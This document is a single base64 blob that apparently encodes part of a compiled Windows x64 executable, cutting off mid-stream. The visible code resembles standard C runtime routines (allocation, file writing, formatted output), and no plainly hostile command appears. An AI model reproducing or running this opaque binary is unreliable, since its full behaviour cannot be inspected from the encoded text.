vY/xWbdAAAi8jocLP//4kDSIvG67vMSIlcJAhXSIPsIEmL+EiL2kiFyXQdM9JIjULgSPfxSDvDcw/oILP//8cADAAAADPA611ID6/ZuAEAAABIhdtID0TYM8BIg/vgdxhIiw0TNAEAjVAITIvD/xUHdQAASIXAdS2DPXNAAQAAdBlIi8vo3az//4XAdctIhf90sscHDAAAAOuqSIX/dAbHBwwAAABIi1wkMEiDxCBfw8zMzMzMzMzMzMzMzMzMzMxmZg8fhAAAAAAASIHs2AQAAE0zwE0zyUiJZCQgTIlEJCjoVGUAAEiBxNgEAADDzMzMzMzMZg8fRAAASIlMJAhIiVQkGESJRCQQScfBIAWTGesIzMzMzMzMZpDDzMzMzMzMZg8fhAAAAAAAw8zMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CBIi+kz/77jAAAATI01wqoAAI0EPkG4VQAAAEiLzZkrwtH4SGPYSIvTSAPSSYsU1ugDAQAAhcB0E3kFjXP/6wONewE7/n7Lg8j/6wtIi8NIA8BBi0TGCEiLXCQwSItsJDhIi3QkQEiLfCRISIPEIEFew8zMSIPsKEiFyXQi6Gb///+FwHgZSJhIPeQAAABzD0iNDf2bAABIA8CLBMHrAjPASIPEKMPMzEyL3EmJWwhJiXMQV0iD7FBMixWFUAEAQYvZSYv4TDMVYBIBAIvydCozwEmJQ+hJiUPgSYlD2IuEJIgAAACJRCQoSIuEJIAAAABJiUPIQf/S6y3odf///0SLy0yLx4vIi4QkiAAAAIvWiUQkKEiLhCSAAAAASIlEJCD/FRV0AABIi1wkYEiLdCRoSIPEUF/DzEUzyUyL0kyL2U2FwHRDTCvaQw+3DBONQb9mg/gZdwRmg8EgQQ+3Eo1Cv2aD+Bl3BGaDwiBJg8ICSf/IdApmhcl0BWY7ynTKD7fCRA+3yUQryEGLwcPMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAEiD7AgPrhwkiwQkSIPECMOJTCQID65UJAjDD65cJAi5wP///yFMJAgPrlQkCMNmDy4Fys0AAHMUZg8uBcjNAAB2CvJIDy3I8kgPKsHDzMzMSIlcJAhXSIPsIIsFKD4BADPbvxQAAACFwHUHuAACAADrBTvHD0zHSGPIuggAAACJBQM+AQDoLqT//0iJBe89AQBIhcB1JI1QCEiLz4k95j0BAOgRpP//SIkF0j0BAEiFwHUHuBoAAADrI0iNDY8cAQBIiQwDSIPBMEiNWwhI/890CUiLBac9AQDr5jPASItcJDBIg8QgX8NIg+wo6KswAACAPUwwAQAAdAXo8TEAAEiLDXo9AQDojaf//0iDJW09AQAASIPEKMNIjQUxHAEAw0BTSIPsIEiL2UiNDSAcAQBIO9lyQEiNBaQfAQBIO9h3NEiL00i4q6qqqqqqqipIK9FI9+pIwfoDSIvKSMHpP0gDyoPBEOj66f//D7prGA9Ig8QgW8NIjUswSIPEIFtI/yXLcQAAzMzMQFNIg+wgSIvag/kUfRODwRDoxun//w+6axgPSIPEIFvDSI1KMEiDxCBbSP8ll3EAAMzMzEiNFY0bAQBIO8pyN0iNBREfAQBIO8h3Kw+6cRgPSCvKSLirqqqqqqqqKkj36UjB+gNIi8pIwek/SAPKg8EQ6VXr//9Ig8EwSP8lTnEAAMzMg/kUfQ0PunIYD4PBEOk26///SI1KMEj/JS9xAADMzMxIg+woSIXJdRXoOq7//8cAFgAAAOjXqf//g8j/6wOLQRxIg8Qow8zMSIPsKIP5/nUN6BKu///HAAkAAADrQoXJeC47DVRNAQBzJkhjyUiNFSAvAQBIi8GD4R9IwfgFSGvJWEiLBMIPvkQICIPgQOsS6NOt///HAAkAAADocKn//zPASIPEKMPMSIlcJBCJTCQIVldBVEFWQVdIg+wgQYvwTIvySGPZg/v+dRjoKK3//4MgAOiQrf//xwAJAAAA6ZEAAACFyXh1Ox3PTAEAc21Ii8NIi/tIwf8FTI0llC4BAIPgH0xr+FhJiwT8Qg++TDgIg+EBdEaLy+hvMAAAkEmLBPxC9kQ4CAF0EUSLxkmL1ovL6FUAAACL+OsW6Cit///HAAkAAADoraz//4MgAIPP/4vL6OwxAACLx+sb6Jes//+DIADo/6z//8cACQAAAOicqP//g8j/SItcJFhIg8QgQV9BXkFcX17DzMzMSIlcJCBVVldBVEFVQVZBV0iNrCTA5f//uEAbAADo5i4AAEgr4EiLBcQNAQBIM8RIiYUwGgAARTPkRYv4TIvySGP5RIlkJEBBi9xBi/RFhcB1BzPA6W4HAABIhdJ1IOgJrP//RIkg6HGs///HABYAAADoDqj//4PI/+lJBwAASIvHSIvPSI0VfS0BAEjB+QWD4B9IiUwkSEiLDMpMa+hYRYpkDThMiWwkWEUC5EHQ/EGNRCT/PAF3FEGLx/fQqAF1C+imq///M8mJCOuaQfZEDQggdA0z0ovPRI1CAuj7BwAAi8/o1P3//0iLfCRIhcAPhEADAABIjQUMLQEASIsE+EH2RAUIgA+EKQMAAOjTsf//SI1UJGRIi4jAAAAAM8BIOYE4AQAAi/hIi0QkSEiNDdQsAQBAD5THSIsMwUmLTA0A/xXJbgAAM8mFwA+E3wIAADPAhf90CUWE5A+EyQIAAP8Vom4AAEmL/olEJGgzwA+3yGaJRCREiUQkYEWF/w+EBgYAAESL6EWE5A+FowEAAIoPTItsJFhIjRVqLAEAgPkKD5TARTPAiUQkZEiLRCRISIsUwkU5RBVQdB9BikQVTIhMJG2IRCRsRYlEFVBBuAIAAABIjVQkbOtJD77J6CIXAACFwHQ0SYvHSCvHSQPGSIP4AQ+OswEAAEiNTCREQbgCAAAASIvX6CwxAACD+P8PhNkBAABI/8frHEG4AQAAAEiL10iNTCRE6AsxAACD+P8PhLgBAACLTCRoM8BMjUQkREiJRCQ4SIlEJDBIjUQkbEG5AQAAADPSx0QkKAUAAABIiUQkIEj/x/8VcmwAAESL6IXAD4RwAQAASItEJEhIjQ2DKwEATI1MJGBIiwzBM8BIjVQkbEiJRCQgSItEJFhFi8VIiwwI/xWUawAAhcAPhC0BAACLRCRAi99BK94D2EQ5bCRgD4ylBAAARTPtRDlsJGR0WEiLRCRIRY1FAcZEJGwNSI0NHysBAEyJbCQgTItsJFhIiwzBTI1MJGBIjVQkbEmLTA0A/xU0awAAhcAPhMMAAACDfCRgAQ+MzwAAAP9EJEAPt0wkRP/D628Pt0wkROtjQY1EJP88AXcZD7cPM8Bmg/kKRIvoZolMJERBD5TFSIPHAkGNRCT/PAF3OOjdLwAAD7dMJERmO8F1dIPDAkWF7XQhuA0AAACLyGaJRCRE6LovAAAPt0wkRGY7wXVR/8P/RCRATItsJFiLx0ErxkE7x3NJM8Dp2P3//4oHTIt8JEhMjSVOKgEAS4sM/P/DSYv/QYhEDUxLiwT8QcdEBVABAAAA6xz/FUNqAACL8OsN/xU5agAAi/BMi2wkWEiLfCRIi0QkQIXbD4XEAwAAM9uF9g+EhgMAAIP+BQ+FbAMAAOjFqP//xwAJAAAA6Eqo//+JMOlN/P//SIt8JEjrB0iLfCRIM8BMjQ3KKQEASYsM+UH2RA0IgA+E6AIAAIvwRYTkD4XYAAAATYvmRYX/D4QqAwAAug0AAADrAjPARItsJEBIjb0wBgAASIvIQYvEQSvGQTvHcydBigQkSf/EPAp1C4gXQf/FSP/HSP/BSP/BiAdI/8dIgfn/EwAAcs5IjYUwBgAARIvHRIlsJEBMi2wkWEQrwEiLRCRISYsMwTPATI1MJFBJi0wNAEiNlTAGAABIiUQkIP8VU2kAAIXAD4Ti/v//A1wkUEiNhTAGAABIK/hIY0QkUEg7xw+M3f7//0GLxLoNAAAATI0N6CgBAEErxkE7xw+CQP///+m9/v//QYD8Ak2L5g+F4AAAAEWF/w+ESAIAALoNAAAA6wIzwESLbCRASI29MAYAAEiLyEGLxEErxkE7x3MyQQ+3BCRJg8QCZoP4CnUPZokXQYPFAkiDxwJIg8ECSIPBAmaJB0iDxwJIgfn+EwAAcsNIjYUwBgAARIvHRIlsJEBMi2wkWEQrwEiLRCRISYsMwTPATI1MJFBJi0wNAEiNlTAGAABIiUQkIP8VZmgAAIXAD4T1/f//A1wkUEiNhTAGAABIK/hIY0QkUEg7xw+M8P3//0GLxLoNAAAATI0N+ycBAEErxkE7xw+CNf///+nQ/f//RYX/D4RoAQAAQbgNAAAA6wIzwEiNTYBIi9BBi8RBK8ZBO8dzL0EPtwQkSYPEAmaD+Ap1DGZEiQFIg8ECSIPCAkiDwgJmiQFIg8ECSIH6qAYAAHLGSI1FgDP/TI1FgCvISIl8JDhIiXwkMIvBuen9AADHRCQoVQ0AAJkrwjPS0fhEi8hIjYUwBgAASIlEJCD/FS1oAABEi+iFwA+EI/3//0hjx0WLxUiNlTAGAABIA9BIi0QkSEiNDS4nAQBIiwzBM8BMjUwkUEiJRCQgSItEJFhEK8dIiwwI/xVEZwAAhcB0CwN8JFBEO+9/tesI/xUPZwAAi/BEO+8Pj838//9Bi9xBuA0AAABBK95BO98Pgv7+///ps/z//0mLTA0ATI1MJFBFi8dJi9ZIiUQkIP8V72YAAIXAdAuLXCRQi8bpl/z///8VumYAAIvwi8PpiPz//0yLbCRYSIt8JEjpefz//4vO6Ael///p7Pj//0iLfCRISI0FciYBAEiLBPhB9kQFCEB0CkGAPhoPhKb4///oK6X//8cAHAAAAOiwpP//iRjps/j//yvYi8NIi40wGgAASDPM6DJ8//9Ii5wkmBsAAEiBxEAbAABBX0FeQV1BXF9eXcPMzMxIiVwkEIlMJAhWV0FUQVZBV0iD7CBBi/BMi/JIY9mD+/51GOhQpP//gyAA6Lik///HAAkAAADplAAAAIXJeHg7HfdDAQBzcEiLw0iL+0jB/wVMjSW8JQEAg+AfTGv4WEmLBPxCD75MOAiD4QF0SYvL6JcnAACQSYsE/EL2RDgIAXQSRIvGSYvWi8voWQAAAEiL+OsX6E+k///HAAkAAADo1KP//4MgAEiDz/+Ly+gSKQAASIvH6xzovKP//4MgAOgkpP//xwAJAAAA6MGf//9Ig8j/SItcJFhIg8QgQV9BXkFcX17DzMzMSIlcJAhIiXQkEFdIg+wgSGPZQYv4SIvyi8voSSgAAEiD+P91EejWo///xwAJAAAASIPI/+tNTI1EJEhEi89Ii9ZIi8j/FfJmAACFwHUP/xXwZAAAi8joVaP//+vTSIvLSIvDSI0VwiQBAEjB+AWD4R9IiwTCSGvJWIBkCAj9SItEJEhIi1wkMEiLdCQ4SIPEIF/DzEBTSIPsIP8F+DABAEiL2bkAEAAA6BeY//9IiUMQSIXAdA2DSxgIx0MkABAAAOsTg0sYBEiNQyDHQyQCAAAASIlDEEiLQxCDYwgASIkDSIPEIFvDzEiJXCQYVVZXQVRBVUFWQVdIjawkIP7//0iB7OACAABIiwUGBAEASDPESImF2AEAADPASIvxSIlMJGhIi/pIjU2oSYvQTYvpiUQkcESL8IlEJFREi+CJRCRIiUQkYIlEJFiL2IlEJFDolKH//+inov//QYPI/0Uz0kiJRYBIhfYPhEsJAAD2RhhATI0NlFP//w+FhgAAAEiLzugy9P//TI0FPwUBAExj0EGNSgKD+QF2IkmL0kmLykiNBWZT//+D4h9IwfkFTGvKWEwDjMgg0AEA6wNNi8hB9kE4fw+F7wgAAEGNQgJMjQ04U///g/gBdhlJi8pJi8KD4R9IwfgFTGvBWE0DhMEg0AEAQfZAOIAPhbsIAABBg8j/RTPSSIX/D4SrCAAARIo/QYvyRIlUJEBEiVQkREGL0kyJVYhFhP8PhKMIAABBuwACAABI/8dIiX2YhfYPiG0IAABBjUfgPFh3EkkPvsdCD7aMCKB2AQCD4Q/rA0GLykhjwUiNDMBIY8JIA8hCD7aUCcB2AQDB6gSJVCRcg/oID4QzCAAAi8qF0g+E4gYAAP/JD4T0BwAA/8kPhJwHAAD/yQ+EWAcAAP/JD4RIBwAA/8kPhAsHAAD/yQ+EKAYAAP/JD4ULBgAAQQ++z4P5ZA+PaQEAAA+EWwIAAIP5QQ+ELwEAAIP5Qw+EzAAAAI1Bu6n9////D4QYAQAAg/lTdG2D+VgPhMYBAACD+Vp0F4P5YQ+ECAEAAIP5Yw+EpwAAAOkcBAAASYtFAEmDxQhIhcB0L0iLWAhIhdt0Jg+/AEEPuuYLcxKZx0QkUAEAAAArwtH46eYDAABEiVQkUOncAwAASIsd1QEBAOnFAwAAQffGMAgAAHUFQQ+67gtJi10ARTvgQYvEuf///38PRMFJg8UIQffGEAgAAA+E/QAAAEiF28dEJFABAAAASA9EHZQBAQBIi8vp1gAAAEH3xjAIAAB1BUEPuu4LSYPFCEH3xhAIAAB0J0UPt034SI1V0EiNTCRETYvD6CsOAABFM9KFwHQZx0QkWAEAAADrD0GKRfjHRCREAQAAAIhF0EiNXdDpLgMAAMdEJGABAAAAQYDHIEGDzkBIjV3QQYvzRYXkD4khAgAAQbwGAAAA6VwCAACD+Wd+3IP5aQ+E6gAAAIP5bg+ErwAAAIP5bw+ElgAAAIP5cHRhg/lzD4QP////g/l1D4TFAAAAg/l4D4XDAgAAjUGv61H/yGZEORF0CEiDwQKFwHXwSCvLSNH56yBIhdtID0QdlwABAEiLy+sK/8hEOBF0B0j/wYXAdfIry4lMJETpfQIAAEG8EAAAAEEPuu4PuAcAAACJRCRwQbkQAAAARYT2eV0EUcZEJEwwQY1R8ohEJE3rUEG5CAAAAEWE9nlBRQvz6zxJi30ASYPFCOhgCwAARTPShcAPhJ0FAABB9sYgdAVmiTfrAok3x0QkWAEAAADpbAMAAEGDzkBBuQoAAACLVCRIuACAAABEhfB0Ck2LRQBJg8UI6zpBD7rmDHLvSYPFCEH2xiB0GUyJbCR4QfbGQHQHTQ+/RfjrHEUPt0X46xVB9sZAdAZNY0X46wRFi0X4TIlsJHhB9sZAdA1NhcB5CEn32EEPuu4IRIXwdQpBD7rmDHIDRYvARYXkeQhBvAEAAADrC0GD5vdFO+NFD0/jRItsJHBJi8BIjZ3PAQAASPfYG8kjyolMJEhBi8xB/8yFyX8FTYXAdCAz0kmLwEljyUj38UyLwI1CMIP4OX4DQQPFiANI/8vr0UyLbCR4SI2FzwEAACvDSP/DiUQkREWF8w+ECQEAAIXAdAmAOzAPhPwAAABI/8v/RCRExgMw6e0AAAB1DkGA/2d1PkG8AQAAAOs2RTvjRQ9P40GB/KMAAAB+JkGNvCRdAQAASGPP6EGS//9IiUWISIXAdAdIi9iL9+sGQbyjAAAASYtFAEiLDbgAAQBJg8UIQQ++/0hj9kiJRaD/FeNeAABIjU2oRIvPSIlMJDCLTCRgTIvGiUwkKEiNTaBIi9NEiWQkIP/QQYv+geeAAAAAdBtFheR1FkiLDX8AAQD/FaFeAABIjVWoSIvL/9BBgP9ndRqF/3UWSIsNVwABAP8VgV4AAEiNVahIi8v/0IA7LXUIQQ+67ghI/8NIi8vo437//0Uz0olEJEREOVQkWA+FVgEAAEH2xkB0MUEPuuYIcwfGRCRMLesLQfbGAXQQxkQkTCu/AQAAAIl8JEjrEUH2xgJ0B8ZEJEwg6+iLfCRIi3QkVEyLfCRoK3QkRCv3QfbGDHURTI1MJEBNi8eL1rEg6KwDAABIi0WATI1MJEBIjUwkTE2Lx4vXSIlEJCDo4wMAAEH2xgh0F0H2xgR1EUyNTCRATYvHi9axMOhyAwAAg3wkUACLfCREdHCF/35sTIv7RQ+3D0iNldABAABIjU2QQbgGAAAA/89NjX8C6PwJAABFM9KFwHU0i1WQhdJ0LUiLRYBMi0QkaEyNTCRASI2N0AEAAEiJRCQg6GcDAABFM9KF/3WsTIt8JGjrLEyLfCRog8j/iUQkQOsiSItFgEyNTCRATYvHi9dIi8tIiUQkIOgwAwAARTPSi0QkQIXAeBpB9sYEdBRMjUwkQE2Lx4vWsSDougIAAEUz0kiLRYhIhcB0D0iLyOhyk///RTPSTIlViEiLfZiLdCRAi1QkXEG7AAIAAEyNDTpM//9Eij9FhP8PhNEBAABBg8j/6Uz5//9BgP9JdDRBgP9odChBgP9sdA1BgP93ddNBD7ruC+vMgD9sdQpI/8dBD7ruDOu9QYPOEOu3QYPOIOuxigdBD7ruDzw2dRGAfwE0dQtIg8cCQQ+67g/rlTwzdRGAfwEydQtIg8cCQQ+69g/rgCxYPCB3FEi5ARCCIAEAAABID6PBD4Jm////RIlUJFxIjVWoQQ+2z0SJVCRQ6GEGAACFwHQhSItUJGhMjUQkQEGKz+h3AQAARIo/SP/HRYT/D4QQAQAASItUJGhMjUQkQEGKz+hWAQAARTPS6fv+//9BgP8qdRlFi2UASYPFCEWF5A+J+f7//0WL4Onx/v//R40kpEEPvsdFjWQk6EaNJGDp2/7//0WL4unT/v//QYD/KnUcQYtFAEmDxQiJRCRUhcAPibn+//9Bg84E99jrEYtEJFSNDIBBD77HjQRIg8DQiUQkVOmX/v//QYD/IHRBQYD/I3QxQYD/K3QiQYD/LXQTQYD/MA+Fdf7//0GDzgjpbP7//0GDzgTpY/7//0GDzgHpWv7//0EPuu4H6VD+//9Bg84C6Uf+//9EiVQkYESJVCRYRIlUJFREiVQkSEWL8kWL4ESJVCRQ6SP+//+F0nQdg/oHdBjoQ5n//8cAFgAAAOjglP//g8j/RTPS6wKLxkQ4VcB0C0iLTbiDocgAAAD9SIuN2AEAAEgzzOg6cP//SIucJDADAABIgcTgAgAAQV9BXkFdQVxfXl3DzMzMQFNIg+wg9kIYQEmL2HQMSIN6EAB1BUH/AOsl/0oIeA1IiwKICEj/Ag+2wesID77J6L+U//+D+P91BAkD6wL/A0iDxCBbw8zMhdJ+TEiJXCQISIlsJBBIiXQkGFdIg+wgSYv5SYvwi9pAiulMi8dIi9ZAis3/y+iF////gz//dASF23/nSItcJDBIi2wkOEiLdCRASIPEIF/DzMzMSIlcJAhIiWwkEEiJdCQYV0FWQVdIg+wgQfZAGEBIi1wkYEmL+USLO0mL6IvyTIvxdAxJg3gQAHUFQQER6z2DIwCF0n4zQYoOTIvHSIvV/87oD////0n/xoM//3USgzsqdRFMi8dIi9WxP+j1/v//hfZ/0oM7AHUDRIk7SItcJEBIi2wkSEiLdCRQSIPEIEFfQV5fw/D/AUiLgdgAAABIhcB0A/D/AEiLgegAAABIhcB0A/D/AEiLgeAAAABIhcB0A/D/AEiLgfgAAABIhcB0A/D/AEiNQShBuAYAAABIjRUQCAEASDlQ8HQLSIsQSIXSdAPw/wJIg3joAHQMSItQ+EiF0nQD8P8CSIPAIEn/yHXMSIuBIAEAAPD/gFwBAADDSIlcJAhIiWwkEEiJdCQYV0iD7CBIi4HwAAAASIvZSIXAdHlIjQ0WDAEASDvBdG1Ii4PYAAAASIXAdGGDOAB1XEiLi+gAAABIhcl0FoM5AHUR6AKP//9Ii4vwAAAA6JIdAABIi4vgAAAASIXJdBaDOQB1Eejgjv//SIuL8AAAAOh8HgAASIuL2AAAAOjIjv//SIuL8AAAAOi8jv//SIuD+AAAAEiFwHRHgzgAdUJIi4sAAQAASIHp/gAAAOiYjv//SIuLEAEAAL+AAAAASCvP6ISO//9Ii4sYAQAASCvP6HWO//9Ii4v4AAAA6GmO//9Ii4sgAQAASI0F4wYBAEg7yHQag7lcAQAAAHUR6FweAABIi4sgAQAA6DyO//9IjbMoAQAASI17KL0GAAAASI0FoQYBAEg5R/B0GkiLD0iFyXQSgzkAdQ3oDY7//0iLDugFjv//SIN/6AB0E0iLT/hIhcl0CoM5AHUF6OuN//9Ig8YISIPHIEj/zXWySIvLSItcJDBIi2wkOEiLdCRASIPEIF/pwo3//8zMSIXJD4SXAAAAQYPJ//BEAQlIi4HYAAAASIXAdATwRAEISIuB6AAAAEiFwHQE8EQBCEiLgeAAAABIhcB0BPBEAQhIi4H4AAAASIXAdATwRAEISI1BKEG4BgAAAEiNFdoFAQBIOVDwdAxIixBIhdJ0BPBEAQpIg3joAHQNSItQ+EiF0nQE8EQBCkiDwCBJ/8h1ykiLgSABAADwRAGIXAEAAEiLwcNAU0iD7CDo9Zr//0iL2IsNuAkBAIWIyAAAAHQYSIO4wAAAAAB0DujVmv//SIuYwAAAAOsruQwAAADoqs///5BIjYvAAAAASIsVFwgBAOgmAAAASIvYuQwAAADoedH//0iF23UIjUsg6CCF//9Ii8NIg8QgW8PMzMxIiVwkCFdIg+wgSIv6SIXSdENIhcl0PkiLGUg72nQxSIkRSIvK6Jb8//9Ihdt0IUiLy+it/v//gzsAdRRIjQW5BwEASDvYdAhIi8vo/Pz//0iLx+sCM8BIi1wkMEiDxCBfw8zMQFNIg+xAi9lIjUwkIOjykv//SItEJCAPttNIi4gIAQAAD7cEUSUAgAAAgHwkOAB0DEiLTCQwg6HIAAAA/UiDxEBbw8xAU0iD7ECL2UiNTCQgM9LorJL//0iLRCQgD7bTSIuICAEAAA+3BFElAIAAAIB8JDgAdAxIi0wkMIOhyAAAAP1Ig8RAW8PMzMxIiw2d9AAAM8BIg8kBSDkNGCEBAA+UwMNIiVwkCEiJdCQYZkSJTCQgV0iD7GBJi/hIi/JIi9lIhdJ1E02FwHQOSIXJdAIhETPA6ZUAAABIhcl0A4MJ/0mB+P///392E+gsk///uxYAAACJGOjIjv//629Ii5QkkAAAAEiNTCRA6PSR//9Ii0QkQEiDuDgBAAAAdX8Pt4QkiAAAALn/AAAAZjvBdlBIhfZ0EkiF/3QNTIvHM9JIi87oYJP//+jPkv//xwAqAAAA6MSS//+LGIB8JFgAdAxIi0wkUIOhyAAAAP2Lw0yNXCRgSYtbEEmLcyBJi+Nfw0iF9nQLSIX/D4SJAAAAiAZIhdt0VccDAQAAAOtNg2QkeABIjUwkeEyNhCSIAAAASIlMJDhIg2QkMACLSARBuQEAAAAz0ol8JChIiXQkIP8VS1QAAIXAdBmDfCR4AA+FZP///0iF23QCiQMz2+lo/////xVoUwAAg/h6D4VH////SIX2dBJIhf90DUyLxzPSSIvO6JCS///o/5H//7siAAAAiRjom43//+ks////zMxIg+w4SINkJCAA6GX+//9Ig8Q4w0iJXCQISIl0JBBXSIPsQIvaSIvRSI1MJCBBi/lBi/DonJD//0iLRCQoD7bTQIR8Ahl1HoX2dBRIi0QkIEiLiAgBAAAPtwRRI8brAjPAhcB0BbgBAAAAgHwkOAB0DEiLTCQwg6HIAAAA/UiLXCRQSIt0JFhIg8RAX8PMzMyL0UG5BAAAAEUzwDPJ6XL////MzEj32RvAg+ABw8zMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAEiD7ChIiUwkMEiJVCQ4RIlEJEBIixJIi8Hoot7////Q6Mve//9Ii8hIi1QkOEiLEkG4AgAAAOiF3v//SIPEKMNIiwQkSIkBw0BTSIPsQIM9qx4BAABIY9l1EEiLBUcFAQAPtwRYg+AE61JIjUwkIDPS6JaP//9Ii0QkIIO41AAAAAF+FUyNRCQgugQAAACLy+jDHAAAi8jrDkiLgAgBAAAPtwxYg+EEgHwkOAB0DEiLRCQwg6DIAAAA/YvBSIPEQFvDzMxIiXwkEEyJdCQgVUiL7EiD7HBIY/lIjU3g6CqP//+B/wABAABzXUiLVeCDutQAAAABfhZMjUXgugEAAACLz+hRHAAASItV4OsOSIuCCAEAAA+3BHiD4AGFwHQQSIuCEAEAAA+2BDjpxAAAAIB9+AB0C0iLRfCDoMgAAAD9i8fpvQAAAEiLReCDuNQAAAABfitEi/dIjVXgQcH+CEEPts7ooPv//4XAdBNEiHUQQIh9EcZFEgC5AgAAAOsY6KCP//+5AQAAAMcAKgAAAECIfRDGRREASItV4MdEJEABAAAATI1NEItCBEiLkjgBAABBuAABAACJRCQ4SI1FIMdEJDADAAAASIlEJCiJTCQgSI1N4OgfDQAAhcAPhE7///+D+AEPtkUgdAkPtk0hweAIC8GAffgAdAtIi03wg6HIAAAA/UyNXCRwSYt7GE2LcyhJi+Ndw8zMgz3hHAEAAHUOjUG/g/gZdwODwSCLwcMz0umO/v//zMxIg+wYRTPATIvJhdJ1SEGD4Q9Ii9EPV8lIg+LwQYvJQYPJ/0HT4WYPbwJmD3TBZg/XwEEjwXUUSIPCEGYPbwJmD3TBZg/XwIXAdOwPvMBIA8LppgAAAIM9s+8AAAIPjZ4AAABMi9EPtsJBg+EPSYPi8IvID1fSweEIC8hmD27BQYvJQYPJ/0HT4fIPcMgAZg9vwmZBD3QCZg9w2QBmD9fIZg9vw2ZBD3QCZg/X0EEj0UEjyXUuD73KZg9vymYPb8NJA8qF0kwPRcFJg8IQZkEPdApmQQ90AmYP18lmD9fQhcl00ovB99gjwf/II9APvcpJA8qF0kwPRcFJi8BIg8QYw/bBD3QZQQ++ATvCTQ9EwUGAOQB040n/wUH2wQ915w+2wmYPbsBmQQ86YwFAcw1MY8FNA8FmQQ86YwFAdLtJg8EQ6+JIiVwkCFdIg+wgSIvZSYtJEEUz0kiF23UY6IqN//+7FgAAAIkY6CaJ//+Lw+mPAAAASIXSdONBi8JFhcBEiBNBD0/A/8BImEg70HcM6FeN//+7IgAAAOvLSI17AcYDMEiLx+saRDgRdAgPvhFI/8HrBbowAAAAiBBI/8BB/8hFhcB/4USIEHgUgDk1fA/rA8YAMEj/yIA4OXT1/gCAOzF1BkH/QQTrF0iLz+gVb///SIvXSIvLTI1AAehGZP//M8BIi1wkMEiDxCBfw8xAU1ZXSIHsgAAAAEiLBd7tAABIM8RIiUQkeEiL8UiL2kiNTCRISYvQSYv56JSL//9IjUQkSEiNVCRASIlEJDiDZCQwAINkJCgAg2QkIABIjUwkaEUzyUyLw+hGJQAAi9hIhf90CEiLTCRASIkPSI1MJGhIi9boch8AAIvIuAMAAACE2HUMg/kBdBqD+QJ1E+sF9sMBdAe4BAAAAOsH9sMCdQIzwIB8JGAAdAxIi0wkWIOhyAAAAP1Ii0wkeEgzzOhEY///SIHEgAAAAF9eW8PMSIlcJBhXSIHsgAAAAEiLBQztAABIM8RIiUQkeEiL+UiL2kiNTCRASYvQ6MWK//9IjUQkQEiNVCRgSIlEJDiDZCQwAINkJCgAg2QkIABIjUwkaEUzyUyLw+h3JAAASI1MJGhIi9eL2Oj4GAAAi8i4AwAAAITYdQyD+QF0GoP5AnUT6wX2wwF0B7gEAAAA6wf2wwJ1AjPAgHwkWAB0DEiLTCRQg6HIAAAA/UiLTCR4SDPM6IJi//9Ii5wkoAAAAEiBxIAAAABfw8xFM8npYP7//0iJXCQIRA+3WgZMi9GLSgRFD7fDuACAAABBuf8HAABmQcHoBGZEI9iLAmZFI8GB4f//DwC7AAAAgEEPt9CF0nQYQTvRdAu6ADwAAGZEA8LrJEG4/38AAOschcl1DYXAdQlBIUIEQSEC61i6ATwAAGZEA8Iz20SLyMHhC8HgC0HB6RVBiQJEC8lEC8tFiUoERYXJeCpBixJDjQQJi8rB6R9Ei8lEC8iNBBJBiQK4//8AAGZEA8BFhcl52kWJSgRmRQvYSItcJAhmRYlaCMPMzMxAVVNWV0iNbCTBSIHsiAAAAEiLBWjrAABIM8RIiUUnSIv6SIlN50iNVedIjU33SYvZSYvw6Pf+//8Pt0X/RTPA8g8QRffyDxFF50yNTQdIjU3nQY1QEWaJRe/oOSsAAA++TQmJDw+/TQdMjUULiU8ESIvTSIvOiUcI6HLE//+FwHUfSIl3EEiLx0iLTSdIM8zoA2H//0iBxIgAAABfXltdw0iDZCQgAEUzyUUzwDPSM8nofoX//8zMuQIAAADpPnr//8zMQFNIg+wgRTPSTIvJSIXJdA5IhdJ0CU2FwHUdZkSJEeiEif//uxYAAACJGOgghf//i8NIg8QgW8NmRDkRdAlIg8ECSP/KdfFIhdJ1BmZFiRHrzUkryEEPtwBmQokEAU2NQAJmhcB0BUj/ynXpSIXSdRBmRYkR6C6J//+7IgAAAOuoM8DrrczMzEBTSIPsIEUz0kiFyXQOSIXSdAlNhcB1HWZEiRHo/4j//7sWAAAAiRjom4T//4vDSIPEIFvDTIvJTSvIQQ+3AGZDiQQBTY1AAmaFwHQFSP/KdelIhdJ1EGZEiRHowIj//7siAAAA678zwOvEzEiLwQ+3EEiDwAJmhdJ19EgrwUjR+Ej/yMPMzMxAU0iD7CAz202FyXUOSIXJdQ5IhdJ1IDPA6y9Ihcl0F0iF0nQSTYXJdQVmiRnr6E2FwHUcZokZ6FyI//+7FgAAAIkY6PiD//+Lw0iDxCBbw0yL2UyL0kmD+f91HE0r2EEPtwBmQ4kEA02NQAJmhcB0L0n/ynXp6yhMK8FDD7cEGGZBiQNNjVsCZoXAdApJ/8p0BUn/yXXkTYXJdQRmQYkbTYXSD4Vu////SYP5/3ULZolcUf5BjUJQ65BmiRno1of//7siAAAA6XX///9Ig+wohcl4IIP5An4Ng/kDdRaLBVwVAQDrIYsFVBUBAIkNThUBAOsT6J+H///HABYAAADoPIP//4PI/0iDxCjDQFNVVldBVEFWQVdIg+xQSIsFiugAAEgzxEiJRCRITIv5M8lBi+hMi+L/FfFIAAAz/0iL8OhLmv//SDk9+BQBAESL8A+F+AAAAEiNDRCzAAAz0kG4AAgAAP8VIkoAAEiL2EiFwHUt/xVkSAAAg/hXD4XgAQAASI0N5LIAAEUzwDPS/xX5SQAASIvYSIXAD4TCAQAASI0V3rIAAEiLy/8V3UgAAEiFwA+EqQEAAEiLyP8Va0gAAEiNFcyyAABIi8tIiQVyFAEA/xW0SAAASIvI/xVLSAAASI0VvLIAAEiLy0iJBVoUAQD/FZRIAABIi8j/FStIAABIjRW0sgAASIvLSIkFQhQBAP8VdEgAAEiLyP8VC0gAAEiJBTwUAQBIhcB0IEiNFaiyAABIi8v/FU9IAABIi8j/FeZHAABIiQUPFAEA/xUZSAAAhcB0HU2F/3QJSYvP/xV3SQAARYX2dCa4BAAAAOnvAAAARYX2dBdIiw3EEwEA/xWuRwAAuAMAAADp0wAAAEiLDcUTAQBIO850Y0g5NcETAQB0Wv8ViUcAAEiLDbITAQBIi9j/FXlHAABMi/BIhdt0PEiFwHQ3/9NIhcB0KkiNTCQwQbkMAAAATI1EJDhIiUwkIEGNUfVIi8hB/9aFwHQH9kQkQAF1Bg+67RXrQEiLDUYTAQBIO850NP8VI0cAAEiFwHQp/9BIi/hIhcB0H0iLDS0TAQBIO850E/8VAkcAAEiFwHQISIvP/9BIi/hIiw3+EgEA/xXoRgAASIXAdBBEi8